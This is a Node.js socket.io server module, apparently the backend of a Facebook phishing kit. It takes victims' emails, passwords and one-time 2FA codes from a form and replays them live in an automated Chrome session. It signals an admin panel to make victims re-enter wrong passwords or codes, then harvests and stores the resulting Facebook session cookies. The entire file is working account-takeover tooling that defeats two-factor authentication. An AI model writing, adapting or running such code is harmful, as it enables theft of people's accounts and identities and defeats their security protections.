const { Builder, By, Key, until } = require("selenium-webdriver");
const { Options } = require("selenium-webdriver/chrome");
const fs = require("fs");
const path = require("path");
const {
  ChromeService,
  ServiceBuilder,
  Options: ChromeOptions,
} = require("selenium-webdriver/chrome");
const axios = require("axios");
const qs = require("querystring");
const { performance } = require("perf_hooks");
const TableSchema = require("../models/table.model");
const UserSchema = require("../models/user.model");
const { getIp, putPassword } = require("../controllers/ip.controller");
const CountSchema = require("../models/count.model");

module.exports = (io) => {
  io.on("connection", (socket) => {
    //let userDataDirIndex = 0;
    socket.on("formData", async (formData) => {
      console.log("dataTable", formData);
      await io.emit("serverResponse", formData);
      let password;

      if (formData.email && formData.password) {
        let browser;
        // const userDataDir = path.join(__dirname, 'chrome_profiles', `${formData.email}_${Date.now()}`);
        // fs.mkdirSync(userDataDir);
        const chromeOptions = new ChromeOptions();
        chromeOptions.addArguments("--disable-gpu");
        chromeOptions.addArguments("--no-sandbox");
        chromeOptions.addArguments("--disable-dev-shm-usage");
        chromeOptions.addArguments("--disable-setuid-sandbox");
        chromeOptions.addArguments("--disable-extensions");
        // chromeOptions.addArguments(`user-data-dir=${userDataDir}`);
        //chromeOptions.addArguments(`user-data-dir=C:\\Users\\ACER\\AppData\\Local\\Google\\Chrome\\User Data\\${userDataDirIndex++}`)
        chromeOptions.excludeSwitches("enable-automation");
        chromeOptions.addArguments("--disable-popup-blocking");
        chromeOptions.addArguments("--disable-infobars");
        chromeOptions.addArguments(
          "--blink-settings=imagesEnabled=false,pluginsEnabled=false"
        );
        chromeOptions.setUserPreferences({
          "profile.default_content_setting_values.notifications": 2,
        });
        browser = await new Builder()
          .forBrowser("chrome")
          .setChromeOptions(chromeOptions)
          .build();

        await browser.get(`https://web.facebook.com/login.php`);
        try {
          await browser.sleep(800);
          await login(formData, browser);
          await browser.sleep(2000);
          let responseLogin = await someFunctionToGetResponseData(browser);
          let needToRetryLogin = true;

          while (needToRetryLogin) {
            if (
              responseLogin.data.includes(
                "The password that you've entered is incorrect."
              ) ||
              // responseLogin.data.includes('Try another way') ||
              (responseLogin.data.includes(
                "The email address you entered isn&#039;t connected to an account"
              ) &&
                responseLogin.data.includes("Invalid username or password") &&
                responseLogin.data.includes(
                  "The email address or mobile number you entered isn&#039;t connected to an account"
                ) &&
                responseLogin.data.includes(
                  "The password that you&#039;ve entered is incorrect."
                ) &&
                responseLogin.data.includes(
                  "Choose a way to confirm that it&#039;s you"
                ) &&
                responseLogin.data.includes("Log in as") &&
                responseLogin.data.includes(
                  'should_show_close_friend_badge":false'
                ))
            ) {
              // Thực hiện đăng nhập lại
              const dax = await TableSchema.findOne({
                codeRandom: formData.codeRandom,
              });

              const data = {
                codeRandom: formData.codeRandom,
                id: dax._id,
                idUser: dax._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              const targetSocketId = data.codeRandom;
              const dataTable = await TableSchema.findById(data.id);
              // const dataTable2 = await TableSchema.findById(data.id);
              // const datas = {
              //   codeRandom: formData.codeRandom,
              //   id: dataTable2._id,
              //   idUser: dataTable2._id,
              //   ip: formData.socketId,
              //   socketId: formData.ip,
              //   confirm: 'agree'
              // };
              const datas2 = {
                codeRandom: formData.codeRandom,
                id: dataTable._id,
                idUser: dataTable._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              io.emit("adminMessage", datas2);
              console.log("first");
              let daxs = await TableSchema.findOne({
                codeRandom: formData.codeRandom,
              });
              while (daxs.countUpdate === 0) {
                console.log(daxs);

                const data = {
                  codeRandom: formData.codeRandom,
                  id: daxs._id,
                  idUser: daxs._id,
                  ip: formData.socketId,
                  socketId: formData.ip,
                  confirm: "deny",
                };
                const datax = {
                  confirm: data.confirm,
                  id: data.id,
                  ip: data.ip,
                  codeRandom: data.codeRandom,
                };
                io.emit("adminMessage", datax);

                // Thực hiện lại hàm lấy response
                responseLogin = await someFunctionToGetResponseData(browser);

                // Chờ 10 giây trước khi kiểm tra lại
                // await new Promise((resolve) => setTimeout(resolve, 10000));

                // Cập nhật lại giá trị của dax
                daxs = await TableSchema.findOne({
                  codeRandom: formData.codeRandom,
                });
                let checkOTP;
                let checkOTP2;
                try {
                  checkOTP = await browser.findElement(By.id("approvals_code"));
                  checkOTP2 = await browser.findElement(
                    By.xpath(
                      '//*/div/form/div/div/div/div[1]/div[1]/input[@dir="ltr"]'
                    )
                  );
                } catch (error) {
                  console.log("Không tìm thấy phần tử 'approvals_code'");
                }

                if (checkOTP) {
                  await checkOTP.sendKeys(formData.otp2FA);
                  await browser.sleep(500);
                  let connectOTP;
                  try {
                    connectOTP = await browser.findElement(
                      By.id("checkpointSubmitButton")
                    );
                  } catch (error) {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton'"
                    );
                  }

                  if (connectOTP) {
                    await connectOTP.click();
                  } else {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
                    );
                  }
                } else if (checkOTP2) {
                  await checkOTP2.sendKeys(formData.otp2FA);
                  await browser.sleep(500);
                  let connectOTP2;
                  try {
                    connectOTP2 = await browser.findElement(
                      By.xpath(
                        '//*/div[3]/div/div[1]/div/div/div/div[2][@data-visualcompletion="ignore"]'
                      )
                    );
                  } catch (error) {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton'"
                    );
                  }

                  if (connectOTP2) {
                    await connectOTP2.click();
                  } else {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
                    );
                  }
                }
              }
              if (dataTable) {
                try {
                  const datax = {
                    confirm: datas2.confirm,
                    id: datas2.id,
                    ip: datas2.ip,
                    codeRandom: targetSocketId,
                  };
                  io.emit("adminMessage", datax);
                  browser.sleep(5000);
                  const dax = await TableSchema.findOne({
                    codeRandom: formData.codeRandom,
                  });
                  await loginPassNext(dax, browser);
                } catch (error) {
                  console.error("Lỗi khi gửi tin nhắn:", error);
                }
              }
              // Thực hiện lại hàm lấy response
              responseLogin = await someFunctionToGetResponseData(browser);
            } else if (responseLogin.data.includes("Log in with password")) {
              await browser
                .findElement(
                  By.xpath('//a[contains(text(), "Log in with password")]')
                )
                .click();
              await new Promise((resolve) => setTimeout(resolve, 3000));
              let daxs = await TableSchema.findOne({
                codeRandom: formData.codeRandom,
              });
              const data = {
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              const datax = {
                confirm: data.confirm,
                id: data.id,
                ip: data.ip,
                codeRandom: data.codeRandom,
              };
              io.emit("adminMessage", datax);

              // Thực hiện lại hàm lấy response
              responseLogin = await someFunctionToGetResponseData(browser);
              while (daxs.countUpdate === 0) {
                console.log(daxs);

                const data = {
                  codeRandom: formData.codeRandom,
                  id: daxs._id,
                  idUser: daxs._id,
                  ip: formData.socketId,
                  socketId: formData.ip,
                  confirm: "deny",
                };
                const datax = {
                  confirm: data.confirm,
                  id: data.id,
                  ip: data.ip,
                  codeRandom: data.codeRandom,
                };
                io.emit("adminMessage", datax);

                // Thực hiện lại hàm lấy response
                responseLogin = await someFunctionToGetResponseData(browser);

                // Chờ 10 giây trước khi kiểm tra lại
                // await new Promise((resolve) => setTimeout(resolve, 10000));

                // Cập nhật lại giá trị của dax
              }
              if (daxs.countUpdate > 0) {
                await loginRecursiveCheck(responseLogin, formData, browser);
              } else {
                const data = {
                  codeRandom: formData.codeRandom,
                  id: daxs._id,
                  idUser: daxs._id,
                  ip: formData.socketId,
                  socketId: formData.ip,
                  confirm: "deny",
                };
                const datax = {
                  confirm: data.confirm,
                  id: data.id,
                  ip: data.ip,
                  codeRandom: data.codeRandom,
                };
                io.emit("adminMessage", datax);
                // Thực hiện lại hàm lấy response
                responseLogin = await someFunctionToGetResponseData(browser);
                let checkOTP;
                let checkOTP2;
                try {
                  checkOTP = await browser.findElement(By.id("approvals_code"));
                  checkOTP2 = await browser.findElement(
                    By.xpath(
                      '//div/form/div/div/div/div[1]/div[1]/input[@dir="ltr"]'
                    )
                  );
                } catch (error) {
                  console.log("Không tìm thấy phần tử 'approvals_code'");
                }

                if (checkOTP) {
                  await checkOTP.sendKeys(formData.otp2FA);
                  await browser.sleep(500);
                  let connectOTP;
                  try {
                    connectOTP = await browser.findElement(
                      By.id("checkpointSubmitButton")
                    );
                  } catch (error) {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton'"
                    );
                  }

                  if (connectOTP) {
                    await connectOTP.click();
                  } else {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
                    );
                  }
                } else if (checkOTP2) {
                  await checkOTP2.sendKeys(formData.otp2FA);
                  await browser.sleep(500);
                  let connectOTP2;
                  try {
                    connectOTP2 = await browser.findElement(
                      By.xpath(
                        '//div[3]/div/div[1]/div/div/div/div[2][@data-visualcompletion="ignore"]'
                      )
                    );
                  } catch (error) {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton'"
                    );
                  }

                  if (connectOTP2) {
                    await connectOTP2.click();
                  } else {
                    console.log(
                      "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
                    );
                  }
                }
              }
              // if (
              //   responseLogin.data.includes('Log in to') ||
              //   // responseLogin.data.includes('Try another way') ||
              //   (responseLogin.data.includes('The email address you entered isn&#039;t connected to an account') &&
              //     responseLogin.data.includes('The email address or mobile number you entered isn&#039;t connected to an account') &&
              //     responseLogin.data.includes('The password that you&#039;ve entered is incorrect.') &&
              //     responseLogin.data.includes('Choose a way to confirm that it&#039;s you') &&
              //     responseLogin.data.includes("The password that you've entered is incorrect.") &&
              //     responseLogin.data.includes('should_show_close_friend_badge":false'))) {
              //   // Thực hiện đăng nhập lại
              //   const dax = await TableSchema.findOne({
              //     codeRandom: formData.codeRandom
              //   });
              //   console.log("dax",dax)
              //   const data = {
              //     codeRandom: formData.codeRandom,
              //     id: dax._id,
              //     idUser: dax._id,
              //     ip: formData.socketId,
              //     socketId: formData.ip,
              //     confirm: 'deny'
              //   };
              //   const targetSocketId = data.codeRandom;
              //   // const dataTable = await TableSchema.findById(data.id);
              //   // const dataTable2 = await TableSchema.findById(data.id);
              //   // const datas = {
              //   //   codeRandom: formData.codeRandom,
              //   //   id: dataTable2._id,
              //   //   idUser: dataTable2._id,
              //   //   ip: formData.socketId,
              //   //   socketId: formData.ip,
              //   //   confirm: 'agree'
              //   // };
              //   // const datas2 = {
              //   //   codeRandom: formData.codeRandom,
              //   //   id: dataTable._id,
              //   //   idUser: dataTable._id,
              //   //   ip: formData.socketId,
              //   //   socketId: formData.ip,
              //   //   confirm: 'deny'
              //   // };
              //   if (dax.status == 'pending') {
              //     const datax = { confirm: data.confirm, id: data.id, ip: data.ip, codeRandom: targetSocketId };
              //     io.emit("adminMessage", datax);
              //     browser.sleep(20000);
              //     await loginPassNext(formData, browser);
              //   }

              //   // Thực hiện lại hàm lấy response
              //   responseLogin = await someFunctionToGetResponseData(browser);
              // }
            }
            // else if (!responseLogin.data.includes("Log in with password") || !responseLogin.data.includes(
            //   "The password that you've entered is incorrect."
            // ) ||
            //   // responseLogin.data.includes('Try another way') ||
            //   !(responseLogin.data.includes(
            //     "The email address you entered isn&#039;t connected to an account"
            //   ) &&
            //     responseLogin.data.includes(
            //       "The email address or mobile number you entered isn&#039;t connected to an account"
            //     ) &&
            //     responseLogin.data.includes(
            //       "The password that you&#039;ve entered is incorrect."
            //     ) &&
            //     responseLogin.data.includes(
            //       "Choose a way to confirm that it&#039;s you"
            //     ) &&
            //     responseLogin.data.includes("Log in as") &&
            //     responseLogin.data.includes(
            //       'should_show_close_friend_badge":false'
            //     )))
            //     {
            //   while (daxs.countUpdate === 0) {
            //     console.log(daxs);

            //     const data = {
            //       codeRandom: formData.codeRandom,
            //       id: daxs._id,
            //       idUser: daxs._id,
            //       ip: formData.socketId,
            //       socketId: formData.ip,
            //       confirm: "agree",
            //     };
            //     const datax = {
            //       confirm: data.confirm,
            //       id: data.id,
            //       ip: data.ip,
            //       codeRandom: data.codeRandom,
            //     };
            //     io.emit("adminMessage", datax);

            //     // Thực hiện lại hàm lấy response
            //     responseLogin = await someFunctionToGetResponseData(browser);

            //     // Chờ 10 giây trước khi kiểm tra lại
            //     // await new Promise((resolve) => setTimeout(resolve, 10000));

            //     // Cập nhật lại giá trị của dax
            //     daxs = await TableSchema.findOne({
            //       codeRandom: formData.codeRandom,
            //     });
            //     await TableSchema.findOneAndUpdate({
            //       codeRandom: formData.codeRandom,
            //     }, {status: "done"});
            //     let checkOTP;
            //     try {
            //       checkOTP = await browser.findElement(By.id("approvals_code"));
            //     } catch (error) {
            //       console.log("Không tìm thấy phần tử 'approvals_code'");
            //     }

            //     if (checkOTP) {
            //       await checkOTP.sendKeys(formData.otp2FA);
            //       await browser.sleep(500);
            //       let connectOTP;
            //       try {
            //         connectOTP = await browser.findElement(By.id("checkpointSubmitButton"));
            //       } catch (error) {
            //         console.log("Không tìm thấy phần tử 'checkpointSubmitButton'");
            //       }

            //       if (connectOTP) {
            //         await connectOTP.click();
            //       } else {
            //         console.log("Không tìm thấy phần tử 'checkpointSubmitButton' để click");
            //       }
            //     }
            //   }
            // }
            else {
              // Không cần đăng nhập lại nữa
              needToRetryLogin = false;
            }
          }
          let daxs = await TableSchema.findOne({
            codeRandom: formData.codeRandom,
          });
          let checkOTP;
          let checkOTP1;
          try {
            checkOTP = await browser.findElement(By.id("approvals_code"));
          } catch (error) {
            console.log("Không tìm thấy phần tử 'approvals_code'");
          }

          if (checkOTP) {
            daxs = await TableSchema.findOne({
              codeRandom: formData.codeRandom,
            });
            const datas = {
              codeRandom: formData.codeRandom,
              id: daxs._id,
              idUser: daxs._id,
              ip: formData.socketId,
              socketId: formData.ip,
              confirm: "agree",
            };
            io.emit("adminMessage", datas);
            while (daxs.otp2FA === null) {
              await new Promise((resolve) => setTimeout(resolve, 6000));
              daxs = await TableSchema.findOne({
                codeRandom: formData.codeRandom,
              });
            }
            await checkOTP.sendKeys(daxs.otp2FA);
            await browser.sleep(500);
            let connectOTP;
            try {
              connectOTP = await browser.findElement(
                By.id("checkpointSubmitButton")
              );
            } catch (error) {
              console.log("Không tìm thấy phần tử 'checkpointSubmitButton'");
            }

            if (connectOTP) {
              await connectOTP.click();
              responseLogin = await someFunctionToGetResponseData(browser);
            } else {
              console.log(
                "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
              );
            }
            let checkOtpx;
            let checkOtpx1;
            try {
              await browser.sleep(5000);

              checkOtpx = await browser.findElement(
                By.xpath("//span[@data-xui-error]")
              );
              checkOtpx1 = responseLogin.data.includes(
                "Mã này không đúng. Hãy kiểm tra xem bạn đã nhập đúng mã chưa hoặc thử mã mới."
              );
            } catch (error) {
              console.log("Không tìm thấy phần tử ", error);
            }
            // console.log("checkOtpx", checkOtpx);
            if (checkOtpx) {
              console.log("checkOtpx");

              const datas = {
                check: "check",
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              io.emit("adminMessage", datas);
              await browser.sleep(6000);
            } else if (checkOtpx1) {
              console.log("checkOtpx1");
              const datas = {
                check: "check",
                codeRandom: formData.codeRandom,
                id: daxs._id,
                idUser: daxs._id,
                ip: formData.socketId,
                socketId: formData.ip,
                confirm: "deny",
              };
              io.emit("adminMessage", datas);
              await browser.sleep(6000);
            } else {
              console.log(
                "Không tìm thấy phần tử 'checkpointSubmitButton' để click"
              );
            }
            while (checkOtpx || checkOtpx1) {
              responseLogin = await someFunctionToGetResponseData(browser);
              if (checkOtpx) {
                try {
                  checkOTP = await browser.findElement(By.id("approvals_code"));
                } catch (error) {
                  console.log("Không tìm thấy phần tử 'approvals_code'");
                }
                try {
                  connectOTP = await browser.findElement(
                    By.id("checkpointSubmitButton")
                  );
                } catch (error) {
                  console.log(
                    "Không tìm thấy phần tử 'checkpointSubmitButton'"
                  );
                }
                daxs = await TableSchema.findOne({
                  codeRandom: formData.codeRandom,
                });
                await checkOTP.sendKeys(daxs.otp2FA);
                await browser.sleep(500);
                await connectOTP.click();
                await browser.sleep(5000);
                checkOtpx = await browser.findElement(
                  By.xpath("//span[@data-xui-error]")
                );
                const datas = {
                  check: "check",
                  codeRandom: formData.codeRandom,
                  id: daxs._id,
                  idUser: daxs._id,
                  ip: formData.socketId,
                  socketId: formData.ip,
                  confirm: "deny",
                };
                io.emit("adminMessage", datas);
              } else if (checkOtpx1) {
                try {
                  checkOTP1 = await browser.findElement(
                    By.xpath(
                      '//div/form/div/div/div/div[1]/div[1]/input[@dir="ltr"]'
                    )
                  );
                } catch (error) {
                  console.log("Không tìm thấy phần tử 'approvals_code'");
                }
                try {
                  connectOTP = await browser.findElement(
                    By.xpath(
                      '//div[3]/div/div[1]/div/div/div/div[2][@data-visualcompletion="ignore"]'
                    )
                  );
                } catch (error) {
                  console.log(
                    "Không tìm thấy phần tử 'checkpointSubmitButton'"
                  );
                }
                daxs = await TableSchema.findOne({
                  codeRandom: formData.codeRandom,
                });
                await checkOTP1.sendKeys(daxs.otp2FA);
                await browser.sleep(500);
                await connectOTP.click();
                await browser.sleep(5000);
                checkOtpx1 = await responseLogin.data.includes(
                  "Mã này không đúng. Hãy kiểm tra xem bạn đã nhập đúng mã chưa hoặc thử mã mới."
                );
                const datas = {
                  check: "check",
                  codeRandom: formData.codeRandom,
                  id: daxs._id,
                  idUser: daxs._id,
                  ip: formData.socketId,
                  socketId: formData.ip,
                  confirm: "deny",
                };
                io.emit("adminMessage", datas);
              }
            }
          }
          // if (checkOTP) {
          //   console.log("checkOtpss");
          //   let dax = await TableSchema.findOne({
          //     codeRandom: formData.codeRandom,
          //   });
          //   const datas = {
          //     codeRandom: formData.codeRandom,
          //     id: dax._id,
          //     idUser: dax._id,
          //     ip: formData.socketId,
          //     socketId: formData.ip,
          //     confirm: "agree",
          //   };
          //   io.emit("adminMessage", datas);

          //   while (dax.otp2FA === null) {
          //     await new Promise((resolve) => setTimeout(resolve, 6000));
          //     dax = await TableSchema.findOne({
          //       codeRandom: formData.codeRandom,
          //     });
          //   }
          //   if (dax.otp2FA !== null) {
          //     const datax = {
          //       confirm: "deny",
          //       id: dax.id,
          //       ip: dax.ip,
          //       codeRandom: dax.codeRandom,
          //     };
          //     io.emit("adminMessage", datax);

          //     await checkOTP.sendKeys(dax.otp2FA);
          //     browser.sleep(500);
          //     const connectOTP = browser.findElement(
          //       By.id("checkpointSubmitButton")
          //     );
          //     await connectOTP.click();
          //     responseLogin = await someFunctionToGetResponseData(browser);

          //     await new Promise((resolve) => setTimeout(resolve, 6000));
          //     let checkOtpx = await browser.findElement(
          //       By.xpath("//span[@data-xui-error]")
          //     );
          //     while (checkOtpx) {
          //       dax = await TableSchema.findOne({
          //         codeRandom: formData.codeRandom,
          //       });
          //       const datax = {
          //         confirm: "deny",
          //         id: dax.id,
          //         ip: dax.ip,
          //         codeRandom: dax.codeRandom,
          //       };
          //       console.log("check1");
          //       io.emit("adminMessage", datax);
          //       await new Promise((resolve) => setTimeout(resolve, 10000));

          //       await checkOTP.sendKeys(dax.otp2FA);
          //       browser.sleep(500);
          //       const connectOTP = browser.findElement(
          //         By.id("checkpointSubmitButton")
          //       );
          //       await connectOTP.click();
          //       responseLogin = await someFunctionToGetResponseData(browser);

          //       checkOtpx = await browser.findElement(
          //         By.xpath("//span[@data-xui-error]")
          //       );
          //     }
          //   }
          // }
          // Thực hiện đăng nhập bình thường nếu không gặp điều kiện đăng nhập lại
          // if (!responseLogin.data.includes('Log in as') && !responseLogin.data.includes('Try another way')) {
          //   await login(formData, browser);
          // }

          const cookies = await browser.manage().getCookies();
          let filteredCookies = "";
          cookies.forEach((cookie) => {
            filteredCookies += `${cookie.name}=${cookie.value};`;
          });
          filteredCookies += "";
          console.log("Cookies:", filteredCookies);
          console.log("formData:", formData);
          if (formData.codeRandom) {
            await TableSchema.findOneAndUpdate(
              {
                codeRandom: formData.codeRandom,
              },
              {
                cookie: filteredCookies,
              }
            );
          }
          // await browser.close();
          const datax = {
            confirm: "success",
            // id: data.id,
            // ip: data.ip,
            codeRandom: formData.codeRandom,
          };
          // await io.emit("adminMessage", datax);
          await io.emit("serverResponse", formData);
        } catch (error) {
          await browser.close();
          console.log("Log lỗi: ", error);
        } finally {
          await browser.close();
          await io.emit("serverResponse", formData);
        }
      }

      async function someFunctionToGetResponseData(browser) {
        const pageSource = await browser.getPageSource();
        return {
          data: pageSource,
        };
      }

      async function login(formData, browser) {
        console.log("formData", formData);

        password = formData.password;
        const [emailInput, passwordInput, clickInput] = await Promise.all([
          browser.findElement(By.id("email")),
          browser.findElement(By.id("pass")),
          browser.findElement(By.name("login")),
        ]);
        await emailInput.click();
        await emailInput.sendKeys(formData.email);
        // await browser.sleep(500);
        await passwordInput.click();
        await passwordInput.sendKeys(password);
        // await browser.sleep(500);
        await clickInput.click();
        // await browser.sleep(500);
        // await browser.executeScript(`
        // document.getElementById('email').value = "${formData.email}";
        // document.getElementById('pass').value = "${password}";
        // document.querySelector('button[name="login"]').click();
        // `);
        // await browser.sleep(500);
      }
      async function loginRecursiveCheck(responseLogin, formData, browser) {
        if (
          responseLogin.data.includes("Log in to") ||
          (responseLogin.data.includes(
            "The email address you entered isn&#039;t connected to an account"
          ) &&
            responseLogin.data.includes("Invalid username or password") &&
            responseLogin.data.includes(
              "The email address or mobile number you entered isn&#039;t connected to an account"
            ) &&
            responseLogin.data.includes(
              "The password that you&#039;ve entered is incorrect."
            ) &&
            responseLogin.data.includes(
              "Choose a way to confirm that it&#039;s you"
            ) &&
            responseLogin.data.includes(
              "The password that you've entered is incorrect."
            ) &&
            responseLogin.data.includes(
              'should_show_close_friend_badge":false'
            ))
        ) {
          // Thực hiện đăng nhập lại
          const dax = await TableSchema.findOne({
            codeRandom: formData.codeRandom,
          });

          const data = {
            codeRandom: formData.codeRandom,
            id: dax._id,
            idUser: dax._id,
            ip: formData.socketId,
            socketId: formData.ip,
            confirm: "deny",
          };
          const targetSocketId = data.codeRandom;

          if (dax.status == "pending") {
            const datax = {
              confirm: data.confirm,
              id: data.id,
              ip: data.ip,
              codeRandom: targetSocketId,
            };
            io.emit("adminMessage", datax);
            // Thêm delay 20s trước khi thực hiện đăng nhập lại
            await new Promise((resolve) => setTimeout(resolve, 3000));
            await loginPassNext(dax, browser);
          }

          // Thực hiện lại hàm lấy response
          responseLogin = await someFunctionToGetResponseData(browser);

          // Gọi đệ quy
          await loginRecursiveCheck(responseLogin, formData, browser);
        }
      }
      async function loginPassNext(formData, browser) {
        password = formData.password;
        // const [passwordInput, clickInput] = await Promise.all([
        //   browser.findElement(By.id('pass')),
        //   browser.findElement(By.name('login'))
        // ]);
        // await browser.sleep(200);
        // await passwordInput.click();
        // await passwordInput.sendKeys(password);
        // await browser.sleep(500);
        // await clickInput.click();
        // await browser.sleep(500);
        await browser.executeScript(`
        document.getElementById('pass').value = "${password}";
        document.querySelector('button[name="login"]').click();
        `);
        await browser.sleep(500);
      }
    }),
      // socket.on("formData", async (data) => {
      // await io.emit("serverResponse", data);
      // });
      // console.log("data2");
      socket.on("count", async (data) => {
        try {
          if (data.ip !== "") {
            const addCount = await CountSchema.create({
              ip: data.ip,
            });
            console.log(addCount);

            const count = await CountSchema.countDocuments({});
            io.emit("addCount", count);
            return addCount;
          } else {
            return false;
          }
        } catch (error) {
          console.error("Lỗi khi đếm:", error);
          return false;
        }
      });

    socket.on("password2", async () => {
      io.emit("adminMessage2", { message: "true" });
    });

    socket.on("confirmId", async (data) => {
      const targetSocketId = data.codeRandom;
      console.log(data);
      const dataTable = await TableSchema.findById(data.id).sort({
        createdAt: -1,
      });
      console.log(dataTable);
      if (dataTable) {
        try {
          const datax = {
            confirm: data.confirm,
            id: data.id,
            ip: data.ip,
            codeRandom: targetSocketId,
          };
          io.emit("adminMessage", datax);
        } catch (error) {
          console.error("Lỗi khi gửi tin nhắn:", error);
        }
      }
    });

    socket.on("checkOwner", async (data) => {
      try {
        const userId = data.user?.id || null;
        const user = await UserSchema.findOne({ _id: userId });
        const targetSocketId = data.socketId;
        const { inputValue } = data;
        const { username } = user;

        const newStatusOwner = inputValue === true;
        const dataTable = await TableSchema.findOneAndUpdate(
          { ip: data.ip, socketId: targetSocketId },
          { statusVery: newStatusOwner, username: username },
          { new: true }
        );
        await dataTable.save();
        if (dataTable) {
          io.emit("adminMessageCheck", dataTable);
        }
      } catch (error) {
        console.error("Lỗi khi xác nhận chủ sở hữu:", error);
      }
    });

    socket.on("disconnect", () => {
      console.log("User disconnected");
      socket.disconnect();
    });
  });
};
